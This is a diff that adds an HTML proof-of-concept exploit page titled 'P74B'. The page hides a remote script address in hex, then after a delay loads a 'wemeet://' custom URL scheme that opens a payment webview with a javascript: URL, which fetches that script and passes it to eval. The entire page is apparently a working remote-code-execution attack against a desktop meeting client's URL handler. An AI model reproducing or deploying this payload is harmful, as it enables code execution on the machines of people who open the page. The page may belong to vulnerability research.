@@ -1,0 +1,16 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P74B</title></head>
+<body><h1>P74B</h1>
+<script>
+document.title='P74B-START';
+var payjs="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7037347061792e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
+function frame(src,label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/pay/main_process_webview?url='+encodeURIComponent(payjs),'P74B-PAYJS'); }, 22000);
+setTimeout(function(){ document.title='P74B-WAIT'; }, 60000);
+</script>
+</body></html>
